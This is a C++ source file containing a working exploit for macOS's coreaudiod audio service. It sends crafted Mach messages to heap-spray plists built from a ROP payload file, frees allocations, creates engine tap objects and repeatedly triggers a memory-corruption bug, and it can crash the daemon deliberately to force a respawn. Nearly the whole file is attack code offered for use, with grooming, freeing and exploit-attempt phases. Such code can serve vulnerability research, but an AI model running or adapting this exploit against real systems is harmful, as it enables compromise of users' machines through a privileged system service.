#include <CoreFoundation/CoreFoundation.h>
#include <mach/mach.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <launch.h>
#include <string.h>
#include <servers/bootstrap.h>
#include <mach/vm_map.h>
#include <iostream>
#include <sstream>
#include <fstream>
#include <cstring>
#include <thread>
#include <vector>
#include <mutex>

// ANSI color codes for pretty printing
#define RESET   "\033[0m"
#define BOLD    "\033[1m"
#define RED     "\033[31m"
#define GREEN   "\033[32m"
#define YELLOW  "\033[33m"
#define BLUE    "\033[34m"
#define MAGENTA "\033[35m"
#define CYAN    "\033[36m"

#define HIGH_OBJECT_ID_THAT_IS_NOT_USED_YET 12000
#define XSYSTEM_OPEN_MSG_SIZE 0x38
#define XIOCONTEXT_FETCH_WORKGROUP_PORT_MSG_SIZE 0x24
#define XSYSTEM_GET_OBJECT_INFO_SIZE 0x24
#define XSYSTEM_CREATE_META_DEVICE_SIZE 0x38

const char *service_name = "com.apple.audio.audiohald";
uint32_t num_iterations = 0;
uint32_t allocs_per_iteration = 0;
uint32_t previous_next_object_id = 0;
mach_port_t bootstrap_port = MACH_PORT_NULL;
mach_port_t service_port = MACH_PORT_NULL;

std::vector<uint32_t> created_devices = {};
uint32_t engine_object_id = 0;

typedef struct {
    mach_msg_header_t header;
    char body0[8];
    uint32_t object_id;
} xiocontext_fetch_workgroup_port_mach_message;

typedef struct {
    mach_msg_header_t header;
    mach_msg_size_t msgh_descriptor_count;
    mach_msg_ool_descriptor_t descriptor[1];
    char body0[8];
    uint32_t plist_length;
} xsystem_createmetadevice_mach_message;

typedef struct {
    mach_msg_header_t header;
    mach_msg_size_t msgh_descriptor_count;
    mach_msg_ool_descriptor_t descriptor[1];
    char body0[8];
    uint32_t object_id;
    uint32_t mSelector;
    uint32_t mScope;
    uint32_t mElement;
    uint32_t plist_length;
} xobject_getpropertydata_dcfstring_qplist_mach_message;

typedef struct {
    mach_msg_header_t header;
    mach_msg_size_t msgh_descriptor_count;
    mach_msg_ool_descriptor_t descriptor[1];
    char body0[8];
    uint32_t object_id;
    uint32_t mSelector;
    uint32_t mScope;
    uint32_t mElement;
    uint32_t plist_length;
} xobject_setpropertydata_dplist_mach_message;

typedef struct {
    mach_msg_header_t header;
    char body0[8];
    uint32_t object_id;
} xsystem_getobjectinfo_mach_message;

typedef struct {
    mach_msg_header_t header;
    mach_msg_size_t msgh_descriptor_count;
    mach_msg_port_descriptor_t descriptor[1];
    char body[];
} xsystemopen_mach_message;

mach_port_t create_mach_port_with_send_and_receive_rights() {
    mach_port_t port;
    kern_return_t kr;

    kr = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &port);
    if (kr != KERN_SUCCESS) {
        fprintf(stderr, RED "‚ùå Failed to allocate port: %s\n" RESET, mach_error_string(kr));
        exit(1);
    }

    kr = mach_port_insert_right(mach_task_self(), port, port, MACH_MSG_TYPE_MAKE_SEND);
    if (kr != KERN_SUCCESS) {
        fprintf(stderr, RED "‚ùå Failed to insert send right: %s\n" RESET, mach_error_string(kr));
        exit(1);
    }

    return port;
}

std::string generateRandomString(size_t length = 10) {
    const char charset[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
    std::string randomString;
    randomString.reserve(length); // Optimize for performance

    for (size_t i = 0; i < length; ++i) {
        randomString += charset[arc4random_uniform(sizeof(charset) - 1)];
    }

    return randomString;
}

char *generateCreateMetaDevicePlist() {
    std::ostringstream plistStream;
    plistStream << "<?xml version=\"1.0\" encoding=\"UTF-8\"?>"
                    "<!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\" "
                    "\"http://www.apple.com/DTDs/PropertyList-1.0.dtd\">"
                    "<plist version=\"1.0\"><dict><key>name</key><string>Heap Grooming Device</string><key>stacked</key><true/><key>uid</key>";

    std::string uid = generateRandomString();

    plistStream << "<string>" << uid << "</string>";

    plistStream << "</dict></plist>";

    std::string plistString = plistStream.str();
    std::cout << CYAN "‚öôÔ∏è  Creating Meta Device with uid: " << BOLD << uid << RESET << std::endl;
    return strdup(plistString.c_str());
}

char *generateCreateEnginePlist() {
    std::ostringstream plistStream;
    plistStream << "<?xml version=\"1.0\" encoding=\"UTF-8\"?>"
                    "<!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\" "
                    "\"http://www.apple.com/DTDs/PropertyList-1.0.dtd\">"
                    "<plist version=\"1.0\"><dict><key>TapUUID</key><string>ExploitTap</string><key>IsMixdown</key><true/></dict></plist>";
    
    std::string plistString = plistStream.str();
    return strdup(plistString.c_str());
}

char * getObjectType(uint32_t object_id) {
    mach_msg_return_t result;
    xsystem_getobjectinfo_mach_message *msg = (xsystem_getobjectinfo_mach_message *)malloc(XSYSTEM_GET_OBJECT_INFO_SIZE);
    void *reply = malloc(100);
    memset(reply, 0xAA, 100);

    mach_port_t reply_port;
    kern_return_t kr;

    kr = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &reply_port);
    if (kr != KERN_SUCCESS) {
        fprintf(stderr, RED "‚ùå Error allocating reply port: %s\n" RESET, mach_error_string(kr));
        return NULL;
    }
    
    msg->header.msgh_bits = MACH_MSGH_BITS_SET(MACH_MSG_TYPE_COPY_SEND, MACH_MSG_TYPE_MAKE_SEND, MACH_PORT_NULL, MACH_PORT_NULL);
    msg->header.msgh_size = XSYSTEM_GET_OBJECT_INFO_SIZE;
    msg->header.msgh_remote_port = service_port;
    msg->header.msgh_local_port = reply_port;
    msg->header.msgh_id = 1010002;
    
    msg->object_id = object_id;

    result = mach_msg(&msg->header, MACH_SEND_MSG | MACH_SEND_TIMEOUT, XSYSTEM_GET_OBJECT_INFO_SIZE, 0, MACH_PORT_NULL, 1000, MACH_PORT_NULL);
    if (result != MACH_MSG_SUCCESS) {
        // printf(RED "‚ùå Mach message send failed for GetObjectInfo: %s\n" RESET, mach_error_string(result));
        free(msg);
        free(reply);
        return NULL;
    }

    result = mach_msg((mach_msg_header_t *)reply, MACH_RCV_MSG | MACH_RCV_TIMEOUT, 0, 100, reply_port, 1000, MACH_PORT_NULL);
    if (result != MACH_MSG_SUCCESS) {
        // fprintf(stderr, RED "‚ùå Error receiving Mach message: %s\n" RESET, mach_error_string(result));
        free(msg);
        free(reply);
        return NULL;
    }

    mach_port_deallocate(mach_task_self(), reply_port);

    free(msg);
    char *type = (char *)malloc(9);
    memcpy(type, (char *)reply+48, 8);
    type[8] = '\0';
    free(reply);

    return type;
}

uint32_t getNextObjectID() {
    if (!previous_next_object_id) previous_next_object_id = HIGH_OBJECT_ID_THAT_IS_NOT_USED_YET;
    for (uint32_t object_id = previous_next_object_id + 50; object_id > 32; object_id--) {
        char *object_type = getObjectType(object_id);

        if (object_type && !strcmp("jboa", object_type+4)) {
            printf(GREEN "‚úÖ Found an object at object ID %d of type %s!\n" RESET, object_id, object_type);
            free(object_type);
            previous_next_object_id = object_id + 1;
            return object_id + 1;
        }
        free(object_type);
    }
    return 1;
}

void *allocate_ool_memory(vm_size_t size, const char *data) {
    void *oolBuffer = NULL;
    if (vm_allocate(mach_task_self(), (vm_address_t *)&oolBuffer, size, VM_FLAGS_ANYWHERE) != KERN_SUCCESS) {
        printf(RED "‚ùå Failed to allocate memory buffer\n" RESET);
        return NULL;
    }

    memcpy(oolBuffer, data, size);

    return oolBuffer;
}

uint32_t createEngineObjects(uint32_t num_engine_objects) {
    for (uint32_t i = 0; i < num_engine_objects; i++) {
        uint32_t next_object_id = getNextObjectID() + 1;

        if (next_object_id == 1) {
            printf(RED "‚ùå Error: Couldn't find the next Object ID...\n" RESET);
            exit(1);
        }
        
        xobject_getpropertydata_dcfstring_qplist_mach_message *msg = new xobject_getpropertydata_dcfstring_qplist_mach_message;
        kern_return_t result;

        msg->msgh_descriptor_count = 1;
        char *data = generateCreateEnginePlist();
        msg->descriptor[0].address = allocate_ool_memory(strlen(data) + 1, data);
        msg->descriptor[0].size = strlen(data) + 1;
        msg->descriptor[0].deallocate = 0;
        msg->descriptor[0].type = 1;
        msg->descriptor[0].copy = 1;
        
        msg->header.msgh_bits = MACH_MSGH_BITS_SET(MACH_MSG_TYPE_COPY_SEND, MACH_MSG_TYPE_MOVE_SEND, MACH_PORT_NULL, MACH_MSGH_BITS_COMPLEX);
        msg->header.msgh_size = sizeof(xobject_getpropertydata_dcfstring_qplist_mach_message);
        msg->header.msgh_remote_port = service_port;
        msg->header.msgh_local_port = MACH_PORT_NULL;
        msg->header.msgh_voucher_port = MACH_PORT_NULL;
        msg->header.msgh_id = 1010042;

        msg->plist_length = strlen(data) + 1;
        msg->object_id = 1;
        msg->mSelector = 'mktp';
        msg->mScope = 'glob';
        msg->mElement = 0;

        result = mach_msg(&msg->header, MACH_SEND_MSG | MACH_SEND_TIMEOUT, sizeof(xobject_getpropertydata_dcfstring_qplist_mach_message), 0, MACH_PORT_NULL, 5000, MACH_PORT_NULL);
        if (result != MACH_MSG_SUCCESS) {
            printf(RED "‚ùå Mach message send failed for CreateMetaDevice %d\n" RESET, result);
            free(msg);
            return 1;
        }

        printf(YELLOW "üîé Checking for successful creation of the Engine Device...\n" RESET);

        char *object_type = getObjectType(next_object_id);
        printf("Object type is: " BOLD "%s" RESET ", ", object_type);
        if (!strcmp(object_type, "ngnejboa")) {
            printf(GREEN "which looks good! ‚úÖ\n" RESET);
        } else {
            printf(RED "which doesn't check out... ‚ùå\n" RESET);
        }

        engine_object_id = next_object_id;
        delete msg;
        free(data);
    }
    return 0;
}

uint32_t createMetaDevice() {
    uint32_t next_object_id = getNextObjectID();
    if (next_object_id == 1) {
        printf(RED "‚ùå Error: Couldn't find the next Object ID...\n" RESET);
        exit(1);
    }
    
    xsystem_createmetadevice_mach_message *msg = new xsystem_createmetadevice_mach_message;
    kern_return_t result;

    msg->msgh_descriptor_count = 1;
    char *data = generateCreateMetaDevicePlist();
    msg->descriptor[0].address = allocate_ool_memory(strlen(data) + 1, data);
    msg->descriptor[0].size = strlen(data) + 1;
    msg->descriptor[0].deallocate = 0;
    msg->descriptor[0].type = 1;
    msg->descriptor[0].copy = 1;
    
    msg->header.msgh_bits = MACH_MSGH_BITS_SET(MACH_MSG_TYPE_COPY_SEND, MACH_MSG_TYPE_MOVE_SEND, MACH_PORT_NULL, MACH_MSGH_BITS_COMPLEX);
    msg->header.msgh_size = sizeof(xsystem_createmetadevice_mach_message);
    msg->header.msgh_remote_port = service_port;
    msg->header.msgh_local_port = MACH_PORT_NULL;
    msg->header.msgh_voucher_port = MACH_PORT_NULL;
    msg->header.msgh_id = 1010005;

    msg->plist_length = strlen(data) + 1;

    result = mach_msg(&msg->header, MACH_SEND_MSG | MACH_SEND_TIMEOUT, sizeof(xsystem_createmetadevice_mach_message), 0, MACH_PORT_NULL, 5000, MACH_PORT_NULL);
    if (result != MACH_MSG_SUCCESS) {
        printf(RED "‚ùå Mach message send failed for CreateMetaDevice %d\n" RESET, result);
        free(msg);
        return 1;
    }

    printf(YELLOW "üîé Checking for successful creation of the Meta Device...\n" RESET);

    char *object_type = getObjectType(next_object_id);
    printf("Object type is: " BOLD "%s" RESET ", ", object_type);
    if (!strcmp(object_type, "ggaaveda")) {
        printf(GREEN "which looks good! ‚úÖ\n" RESET);
        created_devices.push_back(next_object_id);
    } else {
        printf(RED "which doesn't check out... ‚ùå\n" RESET);
        previous_next_object_id += 200;
    }

    delete msg;
    free(data);

    return next_object_id;
}

int sendInitializeClientMessage() {
    kern_return_t kr;
    xsystemopen_mach_message *xsystemopen_msg = (xsystemopen_mach_message *)malloc(XSYSTEM_OPEN_MSG_SIZE);
    mach_port_t reply_port;
    mach_port_t send_right_port = create_mach_port_with_send_and_receive_rights();

    xsystemopen_msg->msgh_descriptor_count = 1;
    xsystemopen_msg->descriptor[0].name = send_right_port;
    xsystemopen_msg->descriptor[0].disposition = MACH_MSG_TYPE_MOVE_SEND;
    xsystemopen_msg->descriptor[0].type = MACH_MSG_PORT_DESCRIPTOR;

    xsystemopen_msg->header.msgh_remote_port = service_port;
    xsystemopen_msg->header.msgh_voucher_port = MACH_PORT_NULL;
    xsystemopen_msg->header.msgh_id = 1010000;

    kr = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &reply_port);
    if (kr != KERN_SUCCESS) {
        fprintf(stderr, RED "‚ùå Error allocating reply port: %s\n" RESET, mach_error_string(kr));
        return kr;
    }

    xsystemopen_msg->header.msgh_local_port = MACH_PORT_NULL;
    xsystemopen_msg->header.msgh_bits = MACH_MSGH_BITS_SET(MACH_MSG_TYPE_COPY_SEND, MACH_MSG_TYPE_MOVE_SEND, MACH_PORT_NULL, MACH_MSGH_BITS_COMPLEX);

    mach_msg_return_t result = mach_msg(&xsystemopen_msg->header, MACH_SEND_MSG | MACH_SEND_TIMEOUT, XSYSTEM_OPEN_MSG_SIZE, 0, send_right_port, 5000, MACH_PORT_NULL);

    free(xsystemopen_msg);

    if (result != KERN_SUCCESS) {
        fprintf(stderr, RED "‚ùå Error sending Mach message: %s\n" RESET, mach_error_string(result));
        return 1;
    }

    mach_port_deallocate(mach_task_self(), send_right_port);

    printf(GREEN "üéâ XSystem_Open stage complete.\n" RESET);
    return 0;
}

static const char b64_table[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";

std::string base64_encode(const std::string& input) {
    std::string encoded;
    int val = 0, valb = -6;
    for (uint8_t c : input) {
        val = (val << 8) + c;
        valb += 8;
        while (valb >= 0) {
            encoded.push_back(b64_table[(val >> valb) & 0x3F]);
            valb -= 6;
        }
    }
    if (valb > -6) encoded.push_back(b64_table[((val << 8) >> (valb + 8)) & 0x3F]);
    while (encoded.size() % 4) encoded.push_back('=');
    return encoded;
}

char* generateAllocationPlistBinary(size_t& out_size) {
    const size_t payload_bytes = 1152;

    std::ifstream ropFile("rop_payload.bin", std::ios::binary | std::ios::ate);
    if (!ropFile.is_open()) {
        std::cerr << RED << "‚ùå Failed to open rop_payload.bin" << RESET << std::endl;
        return nullptr;
    }

    std::streamsize size = ropFile.tellg();
    if (size != payload_bytes) {
        std::cerr << RED << "‚ùå rop_payload.bin must be exactly 1152 bytes, got " << size << RESET << std::endl;
        return nullptr;
    }

    ropFile.seekg(0, std::ios::beg);
    std::vector<uint8_t> raw_bytes(payload_bytes);
    if (!ropFile.read(reinterpret_cast<char*>(raw_bytes.data()), payload_bytes)) {
        std::cerr << RED << "‚ùå Failed to read from rop_payload.bin" << RESET << std::endl;
        return nullptr;
    }
    ropFile.close();

    std::vector<uint16_t> payload_utf16;
    for (size_t i = 0; i < raw_bytes.size(); i += 2) {
        uint16_t val;
        std::memcpy(&val, &raw_bytes[i], 2);
        payload_utf16.push_back(val);
    }

    CFMutableArrayRef cfArray = CFArrayCreateMutable(NULL, 0, &kCFTypeArrayCallBacks);

    for (uint32_t i = 0; i < allocs_per_iteration; ++i) {
        std::vector<uint16_t> full_string;
        full_string.insert(full_string.end(), payload_utf16.begin(), payload_utf16.end());
        
        CFStringRef strEntry = CFStringCreateWithBytes(NULL, reinterpret_cast<const UInt8*>(full_string.data()), full_string.size() * sizeof(uint16_t), kCFStringEncodingUTF16LE, false);

        if (strEntry) {
            CFArrayAppendValue(cfArray, strEntry);
            CFRelease(strEntry);
        } else {
            std::cerr << RED << "‚ùå Failed to create CFString at index " << i << RESET << std::endl;
        }
    }

    CFMutableDictionaryRef dict = CFDictionaryCreateMutable(NULL, 0, &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
    CFStringRef key = CFStringCreateWithCString(NULL, "arr", kCFStringEncodingUTF8);
    CFDictionarySetValue(dict, key, cfArray);
    CFRelease(key);
    CFRelease(cfArray);

    CFErrorRef error = NULL;
    CFDataRef binaryData = CFPropertyListCreateData(NULL, dict, kCFPropertyListBinaryFormat_v1_0, 0, &error);
    CFRelease(dict);

    if (!binaryData) {
        if (error) CFShow(error);
        return nullptr;
    }

    out_size = CFDataGetLength(binaryData);
    char* out = static_cast<char*>(malloc(out_size));
    memcpy(out, CFDataGetBytePtr(binaryData), out_size);

    CFRelease(binaryData);
    return out;
}

int doAllocations(int num_iterations) {
    for (int allocation_count = 0; allocation_count < num_iterations; allocation_count++) {
        printf("üåä Spraying iteration %d/%d (%d allocations via plist)...\n", allocation_count + 1, num_iterations, allocs_per_iteration);
        xobject_setpropertydata_dplist_mach_message *msg = new xobject_setpropertydata_dplist_mach_message;
        msg->msgh_descriptor_count = 1;

        size_t data_size = 0;
        char *data = generateAllocationPlistBinary(data_size);

        msg->descriptor[0].address = allocate_ool_memory(data_size, data);
        msg->descriptor[0].size = data_size;
        msg->descriptor[0].deallocate = 0;
        msg->descriptor[0].type = 1;
        msg->descriptor[0].copy = 1;

        msg->header.msgh_bits = MACH_MSGH_BITS_SET(MACH_MSG_TYPE_COPY_SEND, MACH_MSG_TYPE_MAKE_SEND_ONCE, MACH_PORT_NULL, MACH_MSGH_BITS_COMPLEX);
        msg->header.msgh_size = sizeof(xobject_setpropertydata_dplist_mach_message);
        msg->header.msgh_remote_port = service_port;
        msg->header.msgh_local_port = MACH_PORT_NULL;
        msg->header.msgh_voucher_port = MACH_PORT_NULL;
        msg->header.msgh_id = 1010034;
        
        msg->object_id = createMetaDevice();
        msg->mSelector = 'acom';
        msg->mScope = 'glob';
        msg->mElement = 0;
        msg->plist_length = data_size;

        mach_msg_return_t result = mach_msg(&msg->header, MACH_SEND_MSG | MACH_SEND_TIMEOUT, sizeof(xobject_setpropertydata_dplist_mach_message), 0, MACH_PORT_NULL, 5000, MACH_PORT_NULL);

        delete msg;
        free(data);

        if (result != MACH_MSG_SUCCESS) {
            fprintf(stderr, RED "‚ùå Error sending Mach message: %s\n" RESET, mach_error_string(result));
            return 1;
        }

        printf(GREEN "‚ú® Successfully performed allocations %d\n" RESET, allocation_count + 1);
        usleep(50000);
    }
    return 0;
}

char* generateFreePlist() {
    std::ostringstream plistStream;
    plistStream << "<?xml version=\"1.0\" encoding=\"UTF-8\"?>"
                    "<!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\" "
                    "\"http://www.apple.com/DTDs/PropertyList-1.0.dtd\">"
                    "<plist version=\"1.0\"><dict><key>arr</key><string>FREE</string></dict></plist>";

    std::string plistString = plistStream.str();
    return strdup(plistString.c_str());
}

int freeAllocation() {
    xobject_setpropertydata_dplist_mach_message *msg = new xobject_setpropertydata_dplist_mach_message;
    msg->msgh_descriptor_count = 1;
    char *data = generateFreePlist();

    msg->descriptor[0].address = allocate_ool_memory(strlen(data) + 1, data);
    msg->descriptor[0].size = strlen(data) + 1;
    msg->descriptor[0].deallocate = 0;
    msg->descriptor[0].type = 1;
    msg->descriptor[0].copy = 1;

    msg->header.msgh_bits = MACH_MSGH_BITS_SET(MACH_MSG_TYPE_COPY_SEND, MACH_MSG_TYPE_MAKE_SEND_ONCE, MACH_PORT_NULL, MACH_MSGH_BITS_COMPLEX);
    msg->header.msgh_size = sizeof(xobject_setpropertydata_dplist_mach_message);
    msg->header.msgh_remote_port = service_port;
    msg->header.msgh_local_port = MACH_PORT_NULL;
    msg->header.msgh_voucher_port = MACH_PORT_NULL;
    msg->header.msgh_id = 1010034;

    msg->object_id = created_devices.back();
    created_devices.pop_back();
    msg->mSelector = 'acom';
    msg->mScope = 'glob';
    msg->mElement = 0;
    msg->plist_length = strlen(data) + 1;

    mach_msg_return_t result = mach_msg(&msg->header, MACH_SEND_MSG | MACH_SEND_TIMEOUT, sizeof(xobject_setpropertydata_dplist_mach_message), 0, MACH_PORT_NULL, 5000, MACH_PORT_NULL);
    
    delete msg;
    free(data);

    if (result != MACH_MSG_SUCCESS) {
        fprintf(stderr, RED "‚ùå Error sending Mach message: %s\n" RESET, mach_error_string(result));
        return 1;
    }

    return 0;
}

void trigger_vulnerability(uint32_t object_id) {
    xiocontext_fetch_workgroup_port_mach_message *msg = new xiocontext_fetch_workgroup_port_mach_message;
    
    msg->header.msgh_bits = MACH_MSGH_BITS_SET(MACH_MSG_TYPE_COPY_SEND, MACH_PORT_NULL, MACH_PORT_NULL, MACH_PORT_NULL);
    msg->header.msgh_size = sizeof(xiocontext_fetch_workgroup_port_mach_message);
    msg->header.msgh_remote_port = service_port;
    msg->header.msgh_local_port = MACH_PORT_NULL;
    msg->header.msgh_id = 1010059;
    
    msg->object_id = object_id;

    kern_return_t result = mach_msg(&msg->header, MACH_SEND_MSG | MACH_SEND_TIMEOUT, sizeof(xiocontext_fetch_workgroup_port_mach_message), 0, MACH_PORT_NULL, 5000, MACH_PORT_NULL);

    if (result != KERN_SUCCESS) {
        fprintf(stderr, RED "‚ùå Error in mach_msg send and receive: %s\n" RESET, mach_error_string(result));
        delete msg;
        return;
    }

    delete msg;
}

uint32_t getRandomEngineObject() {
    uint32_t matches[1000];
    size_t count = 0;

    for (uint32_t i = 0x20; i < 200; i++) {
        char *object_type = getObjectType(i);

        if (object_type) {
            if (!strcmp(object_type, "ngnejboa")) {
                printf(GREEN " -> Found ENGN object at ID %d\n" RESET, i);
                matches[count++] = i;
            }
            free(object_type);
        }
    }

    if (count == 0) {
        printf(RED "‚ùå ENGN object not found, something is wrong...\n" RESET);
        exit(1);
    }

    uint32_t chosen = matches[arc4random_uniform(count)];
    printf(MAGENTA "üéØ Random ENGN object chosen to try to exploit: %d\n" RESET, chosen);
    return chosen;
}

void initialize() {
    kern_return_t kr = task_get_bootstrap_port(mach_task_self(), &bootstrap_port);
    if (kr != KERN_SUCCESS) {
        fprintf(stderr, RED "‚ùå Failed to get bootstrap port, error: %s\n" RESET, mach_error_string(kr));
        exit(1);
    }
    printf(GREEN "‚úÖ Got Bootstrap port! %d\n" RESET, bootstrap_port);

    kr = bootstrap_look_up(bootstrap_port, service_name, &service_port);
    if (kr != KERN_SUCCESS) {
        printf(RED "‚ùå bootstrap lookup failed, error: %s\n" RESET, mach_error_string(kr));
        exit(1);
    }
    printf(GREEN "‚úÖ Got service port! %d\n" RESET, service_port);
    printf(BLUE "üëâ Initializing client...\n" RESET);
    sendInitializeClientMessage();
}

#include <getopt.h>

// ... (keep existing includes and defines)

void print_usage(const char *prog_name) {
    fprintf(stderr, "Usage: %s [options]\n", prog_name);
    fprintf(stderr, "Options:\n");
    fprintf(stderr, "  --iterations <n>    Number of grooming iterations (default: 0)\n");
    fprintf(stderr, "  --allocs <n>        Allocations per iteration (default: 0)\n");
    fprintf(stderr, "  --frees <n>         Number of objects to free (default: 0)\n");
    fprintf(stderr, "  --objects <n>       Number of engine objects to create (default: 0)\n");
    fprintf(stderr, "  --pre-crash         Trigger a crash before main exploit attempts (default: false)\n");
    fprintf(stderr, "  --attempts <n>      Number of exploit attempts (default: 0)\n");
    fprintf(stderr, "  --help              Show this help message\n");
}

int main(int argc, char *argv[]) {
    setvbuf(stdout, NULL, _IONBF, 0);

    // Default values
    // num_iterations and allocs_per_iteration are global
    uint32_t num_frees = 0;
    uint32_t num_engine_objects = 0;
    uint32_t trigger_pre_crash = 0; // Default: Don't trigger (equivalent to dont_trigger=1)
    uint32_t num_attempts = 0;

    static struct option long_options[] = {
        {"iterations", required_argument, 0, 'i'},
        {"allocs",     required_argument, 0, 'a'},
        {"frees",      required_argument, 0, 'f'},
        {"objects",    required_argument, 0, 'o'},
        {"pre-crash",  no_argument,       0, 'c'},
        {"attempts",   required_argument, 0, 't'},
        {"help",       no_argument,       0, 'h'},
        {0, 0, 0, 0}
    };

    int opt;
    int option_index = 0;

    while ((opt = getopt_long(argc, argv, "i:a:f:o:ct:h", long_options, &option_index)) != -1) {
        switch (opt) {
            case 'i': num_iterations = (uint32_t)strtoul(optarg, NULL, 10); break;
            case 'a': allocs_per_iteration = (uint32_t)strtoul(optarg, NULL, 10); break;
            case 'f': num_frees = (uint32_t)strtoul(optarg, NULL, 10); break;
            case 'o': num_engine_objects = (uint32_t)strtoul(optarg, NULL, 10); break;
            case 'c': trigger_pre_crash = 1; break;
            case 't': num_attempts = (uint32_t)strtoul(optarg, NULL, 10); break;
            case 'h': print_usage(argv[0]); return 0;
            default: print_usage(argv[0]); return 1;
        }
    }

    initialize();

    if (num_iterations > 0) {
        printf(BLUE "\n--- HEAP GROOMING PHASE ---\n" RESET);
        printf("Performing %d iterations of %d allocations\n", num_iterations, allocs_per_iteration);
        sleep(2);
        doAllocations(num_iterations);
    }

    if (num_frees > 0) {
        printf(BLUE "\n--- FREEING PHASE ---\n" RESET);
        if (num_frees > created_devices.size()) {
            num_frees = created_devices.size();
        }
        for (uint32_t i = 0; i < num_frees; i++) {
            printf("üï≥Ô∏è  Freeing allocation %d...\n", i + 1);
            freeAllocation();
        }
    }

    if (num_engine_objects > 0) {
        printf(BLUE "\n--- VULNERABLE OBJECT CREATION ---\n" RESET);
        createEngineObjects(num_engine_objects);
    }

    if (trigger_pre_crash) {
        printf(MAGENTA "\nüí£ Triggering a crash so we can load new ENGN objects...\n" RESET);
        trigger_vulnerability(0x1);
        printf(YELLOW "‚è≥ Triggered crash, waiting for coreaudiod to respawn...\n" RESET);
        sleep(5);
        initialize();
    }
    
    if (num_attempts > 0) {
        printf(BLUE "\n--- EXPLOIT ATTEMPT PHASE ---\n" RESET);
        for (uint32_t i = 0; i < num_attempts; i++) {
            printf(CYAN "\nüîé Attempt %d of %d: Enumerating ENGN objects in the Audio HAL...\n" RESET, i + 1, num_attempts);
            uint32_t engn_id = getRandomEngineObject();
            printf(MAGENTA "üí• Triggering vulnerability on it...\n" RESET);
            trigger_vulnerability(engn_id);
            printf(YELLOW "üò¥ Sleeping for 5 seconds...\n" RESET);
            sleep(5);
        }
    }

    printf(GREEN "\nüéâ All stages complete.\n" RESET);
    return 0;
}
